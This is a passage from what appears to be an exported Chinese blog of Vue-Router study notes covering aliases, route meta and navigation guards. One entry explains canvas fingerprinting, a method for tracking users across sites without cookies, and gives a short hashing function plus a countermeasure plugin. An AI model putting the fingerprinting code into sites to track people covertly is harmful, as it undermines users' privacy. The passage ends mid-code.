&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<h1 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h1><p>使用别名，在路径不同时，只要符合了定义，就都能对应同一个路由组件</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/root.vue&quot;</span>),</span><br><span class="line">    <span class="comment">// 给该路由起多个别名</span></span><br><span class="line">    <span class="attr">alias</span>: [<span class="string">&quot;/root&quot;</span>, <span class="string">&quot;/root1&quot;</span>, <span class="string">&quot;/root2&quot;</span>],</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user1&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="attr">bbb</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/B.vue&quot;</span>),</span><br><span class="line">          <span class="attr">default</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/A.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user2&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="attr">ccc</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/C.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>canvas指纹追踪技术</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/1.canvas%E6%8C%87%E7%BA%B9%E8%BF%BD%E8%B8%AA%E6%8A%80%E6%9C%AF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="技术场景"><a href="#技术场景" class="headerlink" title="技术场景"></a>技术场景</h1><p>常用于广告联盟</p>
<p>例如在某个网站上看过某个商品，但没有登录过，过两天用同台电脑访问其他网站时，却发现很多同类商品的广告</p>
<h1 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h1><h2 id="旧方式"><a href="#旧方式" class="headerlink" title="旧方式"></a>旧方式</h2><p>在过去可能使用cookie去追踪用户信息，但cookie可以被用户禁止掉，从而无法追踪，并且无法跨域访问</p>
<p>或者使用浏览器指纹(navigator)，它包含：</p>
<ul>
<li>userAgent（用户代理）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 包含系统、浏览器版本等信息</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58&quot;</span><br></pre></td></tr></table></figure></li>
<li>language（浏览器的语言）<code>&quot;zh-CN&quot;</code></li>
<li>platform（操作系统）<code>&quot;Win32&quot;</code></li>
</ul>
<p>等信息，但这些指纹不能对某个人进行唯一性标识，也无法对客户端进行唯一性判定</p>
<p>基于HTML5的诸多高级指纹对此提供了新思路</p>
<h2 id="canvas指纹"><a href="#canvas指纹" class="headerlink" title="canvas指纹"></a>canvas指纹</h2><p>canvas可以绘制一些图形，游戏等，但它也可以用来跟踪用户</p>
<p>调用toDataURL转换base64时，他底层会获取设备，操作系统，浏览器，三合一的唯一标识</p>
<p>三种条件并非无法同时复现，所以canvas指纹并非唯一，但重复概率也已经很小了</p>
<h3 id="生成canvas指纹"><a href="#生成canvas指纹" class="headerlink" title="生成canvas指纹"></a>生成canvas指纹</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">uuid</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> txt = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    ctx.<span class="title function_">fillText</span>(txt, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(canvas.<span class="title function_">toDataURL</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">md5</span>(canvas.<span class="title function_">toDataURL</span>())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>生成的Base64（edge）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:image/png;base64,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</span><br></pre></td></tr></table></figure>

<p>生成的Base64（chrome）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:image/png;base64,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</span><br></pre></td></tr></table></figure>

<p>两个浏览器生成的base64串不同，但图片是一样的</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306291647491.png"></p>
<p>如果base64太长，可以进行MD5压缩或crypto</p>
<h3 id="防止跟踪"><a href="#防止跟踪" class="headerlink" title="防止跟踪"></a>防止跟踪</h3><p>安装随机修改canvas指纹的浏览器插件(CanvasFingerprintBlock)</p>
<p>原理：每次随机往canvas画布里注入一个随机的噪音（肉眼是看不到的），从而影响base64加密结果</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>路由元信息</title>
    <url>/web/study/Vue-Router/9.%E8%B7%AF%E7%94%B1%E5%85%83%E4%BF%A1%E6%81%AF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>通过路由记录的meta属性可以定义路由元信息</p>
<p>使用路由元信息可以在路由中附加自定义数据，例如权限校验表示、路由组件过度名称、持久化（keep-alive）相关配置、标题名称等</p>
<p>可以在导航守卫或路由对象中访问路由的元信息数据</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;vue-router&quot;</span> &#123;</span><br><span class="line">  <span class="comment">// 声明meta的类型</span></span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">RouteMeta</span> &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="built_in">string</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Login.vue&quot;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;登录页面&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/index&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Index.vue&quot;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;首页&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里可以读到meta</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">meta</span>.<span class="property">title</span></span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>导航守卫</title>
    <url>/web/study/Vue-Router/8.%E5%AF%BC%E8%88%AA%E5%AE%88%E5%8D%AB.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="全局前置守卫"><a href="#全局前置守卫" class="headerlink" title="全局前置守卫"></a>全局前置守卫</h1><p>每当有路由进行跳转前，都会执行全局前置守卫的逻辑</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Login.vue&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/index&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Index.vue&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个路径白名单</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&quot;/&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由全局前置守卫</span></span><br><span class="line"><span class="comment">// to：要去哪   from：从哪来   next：执行跳转操作</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 使白名单内路径不会被全局前置守卫拦截，同时检测是否有登录token</span></span><br><span class="line">  <span class="keyword">if</span>(whiteList.<span class="title function_">includes</span>(to.<span class="property">path</span>) || <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;token&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 不使用next()就不能跳转</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 给next()传参，会跳转到指定路径</span></span><br><span class="line">    <span class="title function_">next</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="comment">// 不跳转，如果改变浏览器url，则会跳转至from的地址</span></span><br><span class="line">    <span class="comment">// next(false)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>Login.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;el-card class=&quot;box-card&quot;&gt;</span><br><span class="line">      &lt;el-form ref=&quot;form&quot; :model=&quot;formInline&quot; :rules=&quot;rules&quot; class=&quot;demo-form-inline&quot;&gt;</span><br><span class="line">        &lt;el-form-item prop=&quot;user&quot; label=&quot;账号&quot;&gt;</span><br><span class="line">          &lt;el-input v-model=&quot;formInline.user&quot; placeholder=&quot;请输入账号&quot; clearable /&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">        &lt;el-form-item prop=&quot;password&quot; label=&quot;密码&quot;&gt;</span><br><span class="line">          &lt;el-input type=&quot;password&quot; v-model=&quot;formInline.password&quot; placeholder=&quot;请输入密码&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">        &lt;el-form-item&gt;</span><br><span class="line">          &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">      &lt;/el-form&gt;</span><br><span class="line">    &lt;/el-card&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;</span><br><span class="line">import &#123; ElMessage &#125; from &quot;element-plus&quot;</span><br><span class="line">import type &#123; FormItemRule, FormInstance &#125; from &quot;element-plus&quot;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">type Form = &#123;</span><br><span class="line">  user: string</span><br><span class="line">  password: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Rules = &#123;</span><br><span class="line">  // 遍历Form类型的key</span><br><span class="line">  [K in keyof Form]?: Array&lt;FormItemRule&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const formInline = reactive&lt;Form&gt;(&#123;</span><br><span class="line">  user: &#x27;&#x27;,</span><br><span class="line">  password: &#x27;&#x27;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const form = ref&lt;FormInstance&gt;()</span><br><span class="line">const rules: Rules = &#123;</span><br><span class="line">  user: [</span><br><span class="line">    &#123;</span><br><span class="line">      // 必填</span><br><span class="line">      required: true,</span><br><span class="line">      // 填写不合规时的提示信息</span><br><span class="line">      message: &quot;必须输入账号&quot;,</span><br><span class="line">      // 类型</span><br><span class="line">      type: &quot;string&quot;,</span><br><span class="line">      // 触发的条件</span><br><span class="line">      // trigger: &quot;change&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  password: [</span><br><span class="line">    &#123;</span><br><span class="line">      required: true,</span><br><span class="line">      message: &quot;必须输入密码&quot;,</span><br><span class="line">      type: &quot;string&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const onSubmit = () =&gt; &#123;</span><br><span class="line">  form.value?.validate((validate)=&gt; &#123;</span><br><span class="line">    console.log(validate)</span><br><span class="line">    // 验证是否通过</span><br><span class="line">    if(validate) &#123;</span><br><span class="line">      router.push(&quot;/index&quot;)</span><br><span class="line">      localStorage.setItem(&quot;token&quot;, &quot;114514&quot;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ElMessage.error(&quot;请检查输入&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.login &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>Index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    登陆成功</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h1 id="全局后置守卫"><a href="#全局后置守卫" class="headerlink" title="全局后置守卫"></a>全局后置守卫</h1><p>每当有路由进行跳转后，都会执行全局后置守卫的逻辑</p>
<p>后置守卫相比前置守卫，没有next函数，也不改变导航</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createVNode, render &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">LoadingBar</span> <span class="keyword">from</span> <span class="string">&quot;@/components/LoadingBar.vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将进度条转成虚拟DOM</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Vnode</span> = <span class="title function_">createVNode</span>(<span class="title class_">LoadingBar</span>)</span><br><span class="line"><span class="comment">// 挂载进度条</span></span><br><span class="line"><span class="title function_">render</span>(<span class="title class_">Vnode</span>, <span class="variable language_">document</span>.<span class="property">body</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Login.vue&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/index&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span 